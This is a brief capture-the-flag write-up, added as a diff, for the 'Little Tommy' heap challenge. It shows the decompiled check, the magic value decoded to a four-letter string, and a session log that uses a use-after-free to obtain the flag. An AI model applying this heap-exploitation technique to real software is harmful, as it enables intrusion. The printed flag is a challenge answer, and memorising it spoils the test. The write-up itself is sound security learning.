@@ -1,0 +1,155 @@
+Little Tommy
+
+    case statement ...
+
+
+    case '5':
+      if ((main_account == (char *)0x0) || (*(int *)(main_account + 0x40) != 0x6b637566)) {
+        puts("\nNope.");
+      }
+      else {
+        system("/bin/cat flag");
+      }
+
+
+need an account, and account+64 needs to be 0x6b637566
+
+? 0x6b637566
+int32   1801680230
+uint32  1801680230
+hex     0x6b637566
+octal   015330672546
+unit    1.7G
+segment 6b63000:0566
+string  "fuck"
+fvalue: 1801680230.0
+float:  274980559498912089522569216.000000f
+double: 0.000000
+binary  0b01101011011000110111010101100110
+trits   0t11122120011211122102
+
+
+
+in this there is a use after free
+
+must make at least one account
+delete account
+add memo
+
+then the conditions will be satisfied
+
+----------------------------------------
+
+#################### Welcome to Little Tommy's Handy yet Elegant and Advanced Program ####################
+
+1. Create account
+2. Display account
+3. Delete account
+4. Add memo
+5. Print flag
+
+Please enter an operation number: 2
+2
+
+Sorry, no account found.
+
+1. Create account
+2. Display account
+3. Delete account
+4. Add memo
+5. Print flag
+
+Please enter an operation number: 1
+1
+
+First name: 1234567890123456789012
+1234567890123456789012
+Last name: 1234567890123456789012
+1234567890123456789012
+
+Thank you, your account number 162711576.
+
+1. Create account
+2. Display account
+3. Delete account
+4. Add memo
+5. Print flag
+
+Please enter an operation number: 2
+2
+
+################ Account no. 162711576 ################
+First name: 1234567890123456789012
+Last name: 1234567890123456789012
+Account balance: 0
+
+
+1. Create account
+2. Display account
+3. Delete account
+4. Add memo
+5. Print flag
+
+Please enter an operation number: 3
+3
+
+Account deleted successfully
+
+1. Create account
+2. Display account
+3. Delete account
+4. Add memo
+5. Print flag
+
+Please enter an operation number: 2
+2
+
+################ Account no. 162711576 ################
+First name: 1234567890123456789012
+Last name: 1234567890123456789012
+Account balance: 0
+
+
+1. Create account
+2. Display account
+3. Delete account
+4. Add memo
+5. Print flag
+
+Please enter an operation number: 4
+4
+
+Please enter memo:
+1234567890123456789012345678901234567890123456789012345678901234fuck
+1234567890123456789012345678901234567890123456789012345678901234fuck
+
+Thank you, please keep this reference number number safe: 162711576.
+
+1. Create account
+2. Display account
+3. Delete account
+4. Add memo
+5. Print flag
+
+Please enter an operation number: 2
+2
+
+################ Account no. 162711576 ################
+First name: 1234567890123456789012345678901234567890123456789012345678901234fuck
+
+Last name: 34567890123456789012345678901234fuck
+
+Account balance: 1801680230
+
+
+1. Create account
+2. Display account
+3. Delete account
+4. Add memo
+5. Print flag
+
+Please enter an operation number: 5
+5
+HTB{I_am_so_heaped_up_right_now}
+
+
